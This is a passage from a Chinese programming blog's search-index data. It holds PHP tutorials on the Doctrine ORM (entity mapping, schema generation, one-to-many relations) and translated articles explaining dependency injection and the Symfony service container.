\"bootstrap.php\";return \\Doctrine\\ORM\\Tools\\Console\\ConsoleRunner::createHelperSet($entityManager); 这样就可以使用命令行工具执行一些操作，比如说生成数据表，更新数据表 四.定义数据库实体，创建数据表先来一个简单的，在app目录下创建一个 Product.php 文件，这个文件其实可以理解为是model，即数据库模型文件！内容如下： 1234567891011121314151617181920212223242526&lt;?phpnamespace App;/** * @Entity @Table(name=\"products\",options=&#123;\"collate\"=\"utf8mb4_unicode_ci\", \"charset\"=\"utf8mb4\"&#125;) * Class Product * @package App */class Product&#123; /** * @ID @Column(type=\"integer\") @GenerateDValue * @var int */ protected $id; /** * @Column(type=\"string\") * @var string */ protected $name; /** * @return int */ ......more code&#125; 后面的setter和getter这里省略了，如果有人对 annotation 这种注解方法比较熟悉的话应该可以看懂上面那些注释的意思。 首先在类的注释上，使用了@Entity表明这是一个数据库实体。@Table指定了表名，@ID表明的是主键，@Column表明是数据表字段，使用type声明了类型！ 然后使用命令vendor/bin/doctrine orm:schema-tool:update --force --dump-sql就可以生成数据表： 123456789The following SQL statements will be executed: CREATE TABLE products (id INT NOT NULL, name VARCHAR(255) NOT NULL, PRIMARY KEY(id)) DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci ENGINE = InnoDB;Updating database schema... 1 query was executed [OK] Database schema updated successfully! 使用这种方式建表不用去写SQL语句，无论是mysql还是sql server，或者oracle，都没问题，一键迁移，ORM抹平了数据库之间的差异！ 五.持久化数据到数据表上面的步骤搞定了数据表创建的问题，下面来介绍一下如何插入数据到数据表，为了方便，这里我直接写在index.php里面： 123456789101112&lt;?phprequire \"vendor/autoload.php\";require \"bootstrap.php\";$product = new \\App\\Product();$product-&gt;setName(\"ORM的应用\");$entityManager-&gt;persist($product);$entityManager-&gt;flush();echo \"Created Product Success with ID: \".$product-&gt;getId();var_dump($product); 可以看出来这是一个完全OOP的写法，是先实例化一个数据表实体，然后通过setter去设置去属性，最后调用persist和flush持久化数据库里面。 六.查询数据使用ORM查询数据也很简单,： 123456789101112131415161718&lt;?php//查询所有$productRepository = $entityManager-&gt;getRepository('\\App\\Product');$products = $productRepository-&gt;findAll();foreach ($products as $product) &#123; var_dump($product); var_dump($product-&gt;getName());&#125;//查询单个$id = 3;$product = $entityManager-&gt;find('Product', $id);if ($product === null) &#123; echo \"No product found.\\n\"; exit(1);&#125;var_dump($product); 如果想对数据进行修改也很简单，比如在上面的例子里面，我们查询出id为3的数据，现在我们想修改这条数据: 123&lt;?php$product-&gt;setName(\"ORM更新数据\");$entityManager-&gt;flush(); 我们只需调用这个对象的setter方法，然后flush即可！ 七.表与表之间的关系数据表和数据表之间的关系总体来说可以分为下面几种：1对1，1对多，多对多，在doctrine里面有细分为下面几种： 划分的有点复杂和难理解，这里我就简单介绍其中一种：oneToMany，即1对多关系，这个其实很常见，比如说一个产品可以有多个评论。 从面向对象的思维来说，2个表之间的关系就是2个对象之间的关系，所谓1对多，其实1个对象包含（hasMany）多个其它对象, 在实际数据表设计，为了表达这种关系，也有好几种设计方式： 12345第一种: 在 product 表新增一个字段 comment_ids，用于存放所有评论ID，这种方式查询评论的时候简单，但是一旦要修改数据就头疼了，很少使用。第二种: 在 comment 表新增一个product_id，用于表明当前评论所属的product，查询的时候稍微复杂点，但是便于修改数据。第三种: 新建一个中间表，用来维护2个表之间的关系，中间表一般用来维护多对多的关系，但是也可以用于1对多的关系，这时候查询和修改都比较复杂，好处就是很容易扩展成多对多关系！ 实际开发中，大部分时候都是使用第二种方式来表示1对多的关系。在doctrine里面，对于1对多，有3种形式： 1.双向（bidirectional），这个其实就是对应上面第二种的方式 2.单向结合中间表（Unidirectional with Join Table），这个就是对应上面所说的第三种的方式 3.自引用（Self-referencing)，这个所谓的自引用，其实就是指类似在无限级分类表设计，有一个parent_id字段指向表本身的记录！ 这里我就演示一下第二种方式，通过在 comment 表新建 product_id 字段这种方式。 首先，先定义一下评论实体comment, 基本结构和product差不多： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpnamespace App;/** * @Entity @Table(name=\"comments\",options=&#123;\"collate\"=\"utf8mb4_unicode_ci\", \"charset\"=\"utf8mb4\"&#125;) * Class Product * @package App */class Comment&#123; /** * 这里通过注释设置了需要映射的实体和对应的字段 * @ManyToOne(targetEntity=\"Product\", inversedBy=\"comments\") * @JoinColumn(name=\"product_id\", referenceColumnName=\"id\") * @var Product */ protected $product; /** * @return Product */ public function getProduct(): Product &#123; return $this-&gt;product; &#125; /** * @param Product $product * @return self */ public function setProduct(Product $product): self &#123; $this-&gt;product = $product; return $this; &#125; /** * @ID @Column(type=\"integer\") @GenerateDValue * @var int */ protected $id; /** * @Column(type=\"string\") * @var string */ protected $content; .......more code&#125;``` 但是多了一个属性 product, 因为这种1对多的关系对评论来说就是一个评论拥有一个产品，但是一个产品可以拥有多个评论。同理，我们就需要对 product 实体做一些改动，加入了一个comments属性和一些注解！```php&lt;?php /** * @oneToMany(targetEntity=\"Comment\", mappedBy=\"product\") * @var */ protected $comments; public function __construct() &#123; $this-&gt;comments = new ArrayCollection(); &#125; ....more code 执行 vendor/bin/doctrine orm:schema-tool:update --force --dump-sql更新数据库, 执行之后你会发现comments表会多一个product_id字段, 同时还会多出一个外键索引！ 经过改造之后，现在如果我们需要给一个产品增加一条评论改怎么操作呢？举个例子，我们现在需要给id为3的这个产品增加一条评论，操作如下： 12345678910&lt;?php$id = 3;$product = $entityManager-&gt;find('\\App\\Product', $id);$comment = new \\App\\Comment();$comment-&gt;setContent(\"这是一条评论！\");$comment-&gt;setProduct($product);$entityManager-&gt;persist($comment);$entityManager-&gt;flush(); 执行以上代码，查看数据表你会发现comments表会自动增加一条记录，其product_id为3，在代码里面我们并没有手动去设置product_id，ORM替我们自动完成了这些操作！ 下面再看查询一个产品的所有评论，操作也是相当简单的： 1234&lt;?php$id = 3;$product = $entityManager-&gt;find('\\App\\Product', $id);$comments = $product-&gt;getComments()-&gt;toArray(); 3.总结ORM试图把数据表之间的关系抽象成数据模型对象之间的关系，让开发人员少拼SQL，以更面向对象的方式开发，更加专注业务模型，有好处但是也有很多问题！ 1.在doctrine这个ORM里面，表与表之间的关系是有物理外键索引的，这对于web项目来说并不是优势，虽然外键有利于保证数据安全和完整，但是大大影响了数据库插入速度！而现在大多数web项目都强调高并发，数据库往往都是瓶颈，物理外键只适合一些对数据安全性和完整性要求非常高的项目，比如OA，企业SasS，或金融相关！但是在 Eloquent ORM 里面，数据表是没有物理外键的，表与表的之间关系是在模型层维护的。 2.比较占内存，ORM为了实现这些功能，在内存里面维护了很多对象，有很多额外处理逻辑，查询速度相比你直接运行原生sql慢一点 3.不利于优化SQL语句，虽然ORM最终也是生成sql去执行，但是其sql语句很多时候是不可控的，如果需要优化起来就很麻烦，无法针对每一条sql做优化！如果模型关系非常复杂的话就更难优化了！ 以前参与了一个基于symfony框架的云采购系统的开发，symfony本身就是一个非常重量级的PHP框架，有人戏称用起来和某些Java框架一样，虽然其很多理念非常不错，但是PHP毕竟是脚本语言，并没有jvm的buff加持，导致项目做大了以后，速度非常慢（一个页面大概要1s多），也很占内存（最低2G内存），不过作为一个2b（面向企业）的系统来说，这点还可以接受，毕竟用户不多。 对于很多用户量巨大的web项目来说，数据库可能还有分库分表、读写分离等操作，使用ORM就可能会有很多问题要去解决了，直接拼SQL虽然难看了点，麻烦了点，但是可控性比较高！大家怎么看呢？","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"ORM","slug":"ORM","permalink":"https://wangbjun.github.io/tags/ORM/"}]},{"title":"三、Symfony服务容器介绍","slug":"php-di-symfony","date":"2017-02-05T10:10:00.000Z","updated":"2020-01-08T09:43:32.265Z","comments":true,"path":"2017/02/05/php-di-symfony/","link":"","permalink":"https://wangbjun.github.io/2017/02/05/php-di-symfony/","excerpt":"此文是本人翻译的来自国外某网站一篇文章 Do you need a Dependency Injection Container? 这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：Part 1: What is Dependency Injection?Part 2: Do you need a Dependency Injection Container?Part 3: Introduction to the Symfony Service ContainerPart 4: Symfony Service Container: Using a Builder to create ServicesPart 5: Symfony Service Container: Using XML or YAML to describe ServicesPart 6: The Need for Speed 在依赖注入这系列文章里，之前我们已经谈过一些基本思想。前面2篇文章介绍的东西对于更好的理解我们接下来文章要说的非常重要，现在是时候了解Symfony2里面服务容器的实现了。Symfony里面依赖注入容器是被一个叫sfServiceContainer的类管理的，这是一个非常轻的类，它实现了我们上篇文章里面说到的基本特性。在Symfony里面，一个服务就是一个被容器管理的对象。在上一篇文章Zend_Mail例子里，我们有2个：mailer服务和mail_transport服务：","text":"此文是本人翻译的来自国外某网站一篇文章 Do you need a Dependency Injection Container? 这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：Part 1: What is Dependency Injection?Part 2: Do you need a Dependency Injection Container?Part 3: Introduction to the Symfony Service ContainerPart 4: Symfony Service Container: Using a Builder to create ServicesPart 5: Symfony Service Container: Using XML or YAML to describe ServicesPart 6: The Need for Speed 在依赖注入这系列文章里，之前我们已经谈过一些基本思想。前面2篇文章介绍的东西对于更好的理解我们接下来文章要说的非常重要，现在是时候了解Symfony2里面服务容器的实现了。Symfony里面依赖注入容器是被一个叫sfServiceContainer的类管理的，这是一个非常轻的类，它实现了我们上篇文章里面说到的基本特性。在Symfony里面，一个服务就是一个被容器管理的对象。在上一篇文章Zend_Mail例子里，我们有2个：mailer服务和mail_transport服务： 12345678910111213141516171819202122232425262728293031323334353637class Container&#123; static protected $shared &#x3D; array(); protected $parameters &#x3D; array(); public function __construct(array $parameters &#x3D; array()) &#123; $this-&gt;parameters &#x3D; $parameters; &#125; public function getMailTransport() &#123; return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array( &#39;auth&#39; &#x3D;&gt; &#39;login&#39;, &#39;username&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.username&#39;], &#39;password&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.password&#39;], &#39;ssl&#39; &#x3D;&gt; &#39;ssl&#39;, &#39;port&#39; &#x3D;&gt; 465, )); &#125; public function getMailer() &#123; if (isset(self::$shared[&#39;mailer&#39;])) &#123; return self::$shared[&#39;mailer&#39;]; &#125; $class &#x3D; $this-&gt;parameters[&#39;mailer.class&#39;]; $mailer &#x3D; new $class(); $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport()); return self::$shared[&#39;mailer&#39;] &#x3D; $mailer; &#125;&#125; 如果我们让Container类继承sfServiceContainer类，就可以简化一下代码： 123456789101112131415161718192021222324252627282930class Container extends sfServiceContainer&#123; static protected $shared &#x3D; array(); protected function getMailTransportService() &#123; return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array( &#39;auth&#39; &#x3D;&gt; &#39;login&#39;, &#39;username&#39; &#x3D;&gt; $this[&#39;mailer.username&#39;], &#39;password&#39; &#x3D;&gt; $this[&#39;mailer.password&#39;], &#39;ssl&#39; &#x3D;&gt; &#39;ssl&#39;, &#39;port&#39; &#x3D;&gt; 465, )); &#125; protected function getMailerService() &#123; if (isset(self::$shared[&#39;mailer&#39;])) &#123; return self::$shared[&#39;mailer&#39;]; &#125; $class &#x3D; $this[&#39;mailer.class&#39;]; $mailer &#x3D; new $class(); $mailer-&gt;setDefaultTransport($this-&gt;getMailTransportService()); return self::$shared[&#39;mailer&#39;] &#x3D; $mailer; &#125;&#125; 这还不够，但是这会给我们一个稍微强大和干净的接口。我们做了以下改变： 所有的方法名都以Service为后缀.为了方便，一个服务名字必须以get开始，Service结束，每一个服务都有一个唯一的标识符。通过定义一个getMailTransportService()方法，我们就相当于定义了一个名叫mail_transport的服务。 所有方法都是protected.我们待会就会知道如何从容器取得一个服务了 容器可以通过数组来获取参数值 ($this[‘mailer.class’]) 让我们看看如何使用新的容器类： 12345678910require_once &#39;PATH&#x2F;TO&#x2F;sf&#x2F;lib&#x2F;sfServiceContainerAutoloader.php&#39;;sfServiceContainerAutoloader::register();$sc &#x3D; new Container(array( &#39;mailer.username&#39; &#x3D;&gt; &#39;foo&#39;, &#39;mailer.password&#39; &#x3D;&gt; &#39;bar&#39;, &#39;mailer.class&#39; &#x3D;&gt; &#39;Zend_Mail&#39;,));$mailer &#x3D; $sc-&gt;mailer; 现在，因为Container类已经继承了sfServiceContainer类，接口就清晰多了： 服务可以通过统一的接口获取：123456if ($sc-&gt;hasService(&#39;mailer&#39;))&#123; $mailer &#x3D; $sc-&gt;getService(&#39;mailer&#39;);&#125;$sc-&gt;setService(&#39;mailer&#39;, $mailer); 作为捷径，服务也可以通过属性符号获取123456if (isset($sc-&gt;mailer)) &#123; $mailer &#x3D; $sc-&gt;mailer; &#125; $sc-&gt;mailer &#x3D; $mailer; 参数也可以通过统一的接口获取123456789101112if (!$sc-&gt;hasParameter(&#39;mailer_class&#39;)) &#123; $sc-&gt;setParameter(&#39;mailer_class&#39;, &#39;Zend_Mail&#39;); &#125; echo $sc-&gt;getParameter(&#39;mailer_class&#39;); &#x2F;&#x2F; Override all parameters of the container $sc-&gt;setParameters($parameters); &#x2F;&#x2F; Adds parameters $sc-&gt;addParameters($parameters); 作为捷径，参数也可以通过数组获取123456if (!isset($sc[&#39;mailer.class&#39;])) &#123; $sc[&#39;mailer.class&#39;] &#x3D; &#39;Zend_Mail&#39;; &#125; $mailerClass &#x3D; $sc[&#39;mailer.class&#39;]; 你还可以迭代获取容器里面的所有服务1234foreach ($sc as $id &#x3D;&gt; $service) &#123; echo sprintf(&quot;Service %s is an instance of %s.\\n&quot;, $id, get_class($service)); &#125; 当你有少量服务需要管理的话使用sfServiceContainer类非常有用方便，即使这样你还得做很多基础工作。如果你需要管理的服务增长到一定数量级，我们就需要一种更好的方式。 这也就是为什么大多数时候你并不需要直接使用sfServiceContainer类，但是它作为Symfony依赖注入容器实现的基石，我们还是需要花一些时间去描述它。 在下一篇文章里面，我们会看一下sfServiceContainerBuilder类，它简化了服务定义的过程。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"依赖注入","slug":"依赖注入","permalink":"https://wangbjun.github.io/tags/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/"}]},{"title":"二、你需要一个依赖注入容器吗？","slug":"php-di-need","date":"2017-02-04T05:10:08.000Z","updated":"2020-01-08T09:43:32.229Z","comments":true,"path":"2017/02/04/php-di-need/","link":"","permalink":"https://wangbjun.github.io/2017/02/04/php-di-need/","excerpt":"此文是本人翻译的来自国外某网站一篇文章 Do you need a Dependency Injection Container? 这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：Part 1: What is Dependency Injection?Part 2: Do you need a Dependency Injection Container?Part 3: Introduction to the Symfony Service ContainerPart 4: Symfony Service Container: Using a Builder to create ServicesPart 5: Symfony Service Container: Using XML or YAML to describe ServicesPart 6: The Need for Speed 在这系列第一篇关于依赖注入的文章里，我尝试给出了一个依赖注入的web实例，今天我将要谈谈依赖注入容器。 首先，先看看一句大胆的言论：“大多数情况下，你不需要一个依赖注入容器也能受益于依赖注入”","text":"此文是本人翻译的来自国外某网站一篇文章 Do you need a Dependency Injection Container? 这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：Part 1: What is Dependency Injection?Part 2: Do you need a Dependency Injection Container?Part 3: Introduction to the Symfony Service ContainerPart 4: Symfony Service Container: Using a Builder to create ServicesPart 5: Symfony Service Container: Using XML or YAML to describe ServicesPart 6: The Need for Speed 在这系列第一篇关于依赖注入的文章里，我尝试给出了一个依赖注入的web实例，今天我将要谈谈依赖注入容器。 首先，先看看一句大胆的言论：“大多数情况下，你不需要一个依赖注入容器也能受益于依赖注入” 但是当你有很多对象需要解决很多依赖，一个依赖注入容器就会非常有用（想一想那些框架）。如果你记得第一篇文章的例子，创建一个User对象需要先创建一个SessionStorage对象。这不是什么大问题，但是你在你创建所需对象之前至少需要知道你所需要的依赖： 12$storage &#x3D; new SessionStorage(&#39;SESSION_ID&#39;);$user &#x3D; new User($storage); 在接下来的文章里面，我将会谈谈Symfony2框架里面对依赖注入容器的实现。但是有一点我想说清楚，这种实现和Symfony框架本身没有什么关系，我会采用Zend框架里面例子来阐述。 Zend框架里面的Mail库简化了邮件操作，使用PHP mail() 函数就能发送邮件，但是这不太灵活。值得感谢的是，通过提供一个transport对象就可以很容易改变这点。下面的这段代码就展示了创建一个使用Gmail账号发送邮件的Zend_Mail对象： 12345678910$transport &#x3D; new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array( &#39;auth&#39; &#x3D;&gt; &#39;login&#39;, &#39;username&#39; &#x3D;&gt; &#39;foo&#39;, &#39;password&#39; &#x3D;&gt; &#39;bar&#39;, &#39;ssl&#39; &#x3D;&gt; &#39;ssl&#39;, &#39;port&#39; &#x3D;&gt; 465,));$mailer &#x3D; new Zend_Mail();$mailer-&gt;setDefaultTransport($transport); 一个依赖注入容器就是一个知道如何初始化和配置对象的容器。为了完成这个任务，它需要知道构造器参数和对象之间的关系。下面是一段简单的硬编码的容器，针对之前的Zend_Mail例子： 123456789101112131415161718192021class Container&#123; public function getMailTransport() &#123; return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array( &#39;auth&#39; &#x3D;&gt; &#39;login&#39;, &#39;username&#39; &#x3D;&gt; &#39;foo&#39;, &#39;password&#39; &#x3D;&gt; &#39;bar&#39;, &#39;ssl&#39; &#x3D;&gt; &#39;ssl&#39;, &#39;port&#39; &#x3D;&gt; 465, )); &#125; public function getMailer() &#123; $mailer &#x3D; new Zend_Mail(); $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport()); return $mailer; &#125;&#125; 使用容器很简单： 12$container &#x3D; new Container();$mailer &#x3D; $container-&gt;getMailer(); 当使用容器的时候，我们只需要一个mailer对象即可，我们不需要知道如何去创建，所有关于mailer对象创建的东西都被封装在容器内部。但是，机智的读者可能会发现一个问题，容器里面都是硬编码的。所以我们需要进一步优化，添加一些参数，这样容器会更有用： 12345678910111213141516171819202122232425262728class Container&#123; protected $parameters &#x3D; array(); public function __construct(array $parameters &#x3D; array()) &#123; $this-&gt;parameters &#x3D; $parameters; &#125; public function getMailTransport() &#123; return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array( &#39;auth&#39; &#x3D;&gt; &#39;login&#39;, &#39;username&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.username&#39;], &#39;password&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.password&#39;], &#39;ssl&#39; &#x3D;&gt; &#39;ssl&#39;, &#39;port&#39; &#x3D;&gt; 465, )); &#125; public function getMailer() &#123; $mailer &#x3D; new Zend_Mail(); $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport()); return $mailer; &#125;&#125; 现在你就很容易通过构造函数传递用户名和密码等参数： 12345$container &#x3D; new Container(array( &#39;mailer.username&#39; &#x3D;&gt; &#39;foo&#39;, &#39;mailer.password&#39; &#x3D;&gt; &#39;bar&#39;,));$mailer &#x3D; $container-&gt;getMailer(); 如果你需要改变mailer类来测试，对象的名字也可以通过参数来传递： 123456789101112131415161718192021class Container&#123; &#x2F;&#x2F; ... public function getMailer() &#123; $class &#x3D; $this-&gt;parameters[&#39;mailer.class&#39;]; $mailer &#x3D; new $class(); $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport()); return $mailer; &#125;&#125;$container &#x3D; new Container(array( &#39;mailer.username&#39; &#x3D;&gt; &#39;foo&#39;, &#39;mailer.password&#39; &#x3D;&gt; &#39;bar&#39;, &#39;mailer.class&#39; &#x3D;&gt; &#39;Zend_Mail&#39;,));$mailer &#x3D; $container-&gt;getMailer(); 最后，但不是最少，每次我想要一个mailer，我不必新建一个实例，所以容器可以被改造成每次返回同一个对象： 123456789101112131415161718192021class Container&#123; static protected $shared &#x3D; array(); &#x2F;&#x2F; ... public function getMailer() &#123; if (isset(self::$shared[&#39;mailer&#39;])) &#123; return self::$shared[&#39;mailer&#39;]; &#125; $class &#x3D; $this-&gt;parameters[&#39;mailer.class&#39;]; $mailer &#x3D; new $class(); $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport()); return self::$shared[&#39;mailer&#39;] &#x3D; $mailer; &#125;&#125; 通过引入一个静态的$shared属性，每次你调用getMailer()都会返回第一次创建的对象 容器包装了需要实现的基本特性，依赖注入容器管理对象：从初始化到配置。对象本身不知道自己被容器管理，更不知道容器。所以容器可以管理任何PHP对象，如果对象使用依赖注入解决依赖就更好了，但那不是先决条件。 当然，通过手动创建和维护容器类可能会成为噩梦。但是一个可以使用的容器的要求还是很低的，很容易实现。下一章我会介绍Symfony2框架里面依赖注入的实现","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"依赖注入","slug":"依赖注入","permalink":"https://wangbjun.github.io/tags/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/"}]},{"title":"一、什么是依赖注入？","slug":"php-di-what-is","date":"2017-02-01T11:10:00.000Z","updated":"2020-01-08T09:43:32.273Z","comments":true,"path":"2017/02/01/php-di-what-is/","link":"","permalink":"https://wangbjun.github.io/2017/02/01/php-di-what-is/","excerpt":"此文是本人翻译的来自国外某网站一篇文章 What is Dependency Injection?,第一次翻译，各位见谅 这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：Part 1: What is Dependency Injection?Part 2: Do you need a Dependency Injection Container?Part 3: Introduction to the Symfony Service ContainerPart 4: Symfony Service Container: Using a Builder to create ServicesPart 5: Symfony Service Container: Using XML or YAML to describe ServicesPart 6: The Need for Speed 今天，我一开始不会讲容器，我希望先通过一些具体的实例来介绍一下依赖注入的理念以及其所尝试解决的问题和它能给开发者带来的好处。如果你已经了解依赖注入，你可以跳过这篇文章去看下一篇。依赖注入可能是我知道的最简单的设计模式之一，很可能你已经使用过，但是同时也是最难解释的，原因可能是大多数介绍依赖注入的文章用的例子都比较无聊。我想了一个比较适合PHP领域的例子，因为PHP主要用在web开发，所以让我们来看一个简单的web实例。为了解决http协议无状态的问题，web应用需要一种在web请求之间记录用户信息的方法，简单的通过cookie或者session都能解决： 1$_SESSION[&#39;language&#39;] &#x3D; &#39;fr&#39;;","text":"此文是本人翻译的来自国外某网站一篇文章 What is Dependency Injection?,第一次翻译，各位见谅 这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：Part 1: What is Dependency Injection?Part 2: Do you need a Dependency Injection Container?Part 3: Introduction to the Symfony Service ContainerPart 4: Symfony Service Container: Using a Builder to create ServicesPart 5: Symfony Service Container: Using XML or YAML to describe ServicesPart 6: The Need for Speed 今天，我一开始不会讲容器，我希望先通过一些具体的实例来介绍一下依赖注入的理念以及其所尝试解决的问题和它能给开发者带来的好处。如果你已经了解依赖注入，你可以跳过这篇文章去看下一篇。依赖注入可能是我知道的最简单的设计模式之一，很可能你已经使用过，但是同时也是最难解释的，原因可能是大多数介绍依赖注入的文章用的例子都比较无聊。我想了一个比较适合PHP领域的例子，因为PHP主要用在web开发，所以让我们来看一个简单的web实例。为了解决http协议无状态的问题，web应用需要一种在web请求之间记录用户信息的方法，简单的通过cookie或者session都能解决： 1$_SESSION[&#39;language&#39;] &#x3D; &#39;fr&#39;; 上面的代码把用户的语言存在了session变量里面。这样，对于同一个用户的请求，其所使用的语言就会被存储在$_SESSION数组里面，我们可以这样获取： 1$user_language &#x3D; $_SESSION[&#39;language&#39;]; 由于依赖注入只在面向对象的世界里有意义，我们假装我们有一个叫SessionStorage的类封装了处理session的方法： 1234567891011121314151617class SessionStorage&#123; function __construct($cookieName &#x3D; &#39;PHP_SESS_ID&#39;) &#123; session_name($cookieName); session_start(); &#125; function set($key, $value) &#123; $_SESSION[$key] &#x3D; $value; &#125; function get($key) &#123; return $_SESSION[$key]; &#125; &#x2F;&#x2F; ...&#125; …和一个提供高级接口的易用的User类 123456789101112131415161718192021class User&#123; protected $storage; function __construct() &#123; $this-&gt;storage &#x3D; new SessionStorage(); &#125; function setLanguage($language) &#123; $this-&gt;storage-&gt;set(&#39;language&#39;, $language); &#125; function getLanguage() &#123; return $this-&gt;storage-&gt;get(&#39;language&#39;); &#125; &#x2F;&#x2F; ...&#125; 这些类足够简单，使用User类也非常容易： 123$user &#x3D; new User();$user-&gt;setLanguage(&#39;fr&#39;);$user_language &#x3D; $user-&gt;getLanguage(); 到目前为止，一切都很好…除非你想要更多的灵活性。万一你想要改变session里面的cookie名字呢？你可能会使用下面这些方法： 在SessionStorage构造器里面硬编码名字123456789class User &#123; function __construct() &#123; $this-&gt;storage &#x3D; new SessionStorage(&#39;SESSION_ID&#39;); &#125; &#x2F;&#x2F; ... &#125; 在User类外面定义一个常量12345678910define(&#39;STORAGE_SESSION_NAME&#39;, &#39;SESSION_ID&#39;);class User &#123; function __construct() &#123; $this-&gt;storage &#x3D; new SessionStorage(STORAGE_SESSION_NAME); &#125; &#x2F;&#x2F; ... &#125; 在User类构造器里面传递一个名字作为参数1234567891011class User &#123; function __construct($sessionName) &#123; $this-&gt;storage &#x3D; new SessionStorage($sessionName); &#125; &#x2F;&#x2F; ... &#125; $user &#x3D; new User(&#39;SESSION_ID&#39;); 在User类构造器里面传递一个数组选项1234567891011class User&#123; function __construct($storageOptions) &#123; $this-&gt;storage &#x3D; new SessionStorage($storageOptions[&#39;session_name&#39;]); &#125; &#x2F;&#x2F; ...&#125;$user &#x3D; new User(array(&#39;session_name&#39; &#x3D;&gt; &#39;SESSION_ID&#39;)); 以上的所有选择都很烂，硬编码名字没有真正解决问题因为你以后可能随时会改变注意，你还得更改User类。使用常量也是一个坏注意，因为你又依赖了一个常量。通过传递一个数组参数可能是一个好的解决方案，但是依然不太好，它把User构造器和一个和它本身不相关的东西耦合了。而且还有一个问题没法容易搞定：我怎么换掉SessionStorage类？比方说，用一个mock对象去测试，或者你想把session保存在数据库或内存里面。在目前的代码里面除非你更改User类，否则无法实现。 依赖注入不要在User类里面创建SessionStorage对象，我们在类外面创建SessionStorage对象，然后通过构造函数把其作为参数传进来： 123456789class User&#123; function __construct($storage) &#123; $this-&gt;storage &#x3D; $storage; &#125; &#x2F;&#x2F; ...&#125; 这就是依赖注入,就是这些！ 12$storage &#x3D; new SessionStorage(&#39;SESSION_ID&#39;);$user &#x3D; new User($storage); 现在，配置一个session存储对象非常简单了，替换它也很容易，不用改变User类也可以实现其他功能。 Pico Container website 这样形容依赖注入：“依赖注入就是通过构造器、方法、属性获取所需要的元素”依赖注入不仅仅局限于此： 构造器注入：123456789class User &#123; function __construct($storage) &#123; $this-&gt;storage &#x3D; $storage; &#125; &#x2F;&#x2F; ... &#125; Setter注入：123456789class User &#123; function setSessionStorage($storage) &#123; $this-&gt;storage &#x3D; $storage; &#125; &#x2F;&#x2F; ... &#125; 属性注入：123456class User &#123; public $sessionStorage; &#125; $user-&gt;sessionStorage &#x3D; $storage; 一般来说，构造器注入最适合必要依赖，就像例子里面那样，Setter注入比较适合可选依赖，比如说缓存对象。当今，很多现代PHP框架大量使用依赖注入提供一系列既解耦又有凝聚力的组件： 1234567891011121314&#x2F;&#x2F; symfony: A constructor injection example$dispatcher &#x3D; new sfEventDispatcher();$storage &#x3D; new sfMySQLSessionStorage(array(&#39;database&#39; &#x3D;&gt; &#39;session&#39;, &#39;db_table&#39; &#x3D;&gt; &#39;session&#39;));$user &#x3D; new sfUser($dispatcher, $storage, array(&#39;default_culture&#39; &#x3D;&gt; &#39;en&#39;));&#x2F;&#x2F; Zend Framework: A setter injection example$transport &#x3D; new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array( &#39;auth&#39; &#x3D;&gt; &#39;login&#39;, &#39;username&#39; &#x3D;&gt; &#39;foo&#39;, &#39;password&#39; &#x3D;&gt; &#39;bar&#39;, &#39;ssl&#39; &#x3D;&gt; &#39;ssl&#39;, &#39;port&#39; &#x3D;&gt; 465,));$mailer &#x3D; new Zend_Mail();$mailer-&gt;setDefaultTransport($transport); 如果你想了解更多关于依赖注入的东西，我强烈建议你读一读Martin Fowler introduction 或者 Jeff More presentation。你也可以看看我去年关于依赖注入的演讲,这里讲了更多细节 好了，就说这么多了，我希望你现在对依赖注入有更好的理解，本系列的下一章我会讲关于依赖注入容器","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"},{"name":"依赖注入","slug":"依赖注入","permalink":"https://wangbjun.github.io/tags/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/"}]},{"title":"PHP设计模式之过滤器模式","slug":"php-designpattern-filter","date":"2017-01-02T01:00:00.000Z","updated":"2020-01-08T09:43:32.153Z","comments":true,"path":"2017/01/02/php-designpattern-filter/","link":"","permalink":"https://wangbjun.github.io/2017/01/02/php-designpattern-filter/","excerpt":"过滤器模式 过滤器模式（Filter Pattern）或标准模式（Criteria 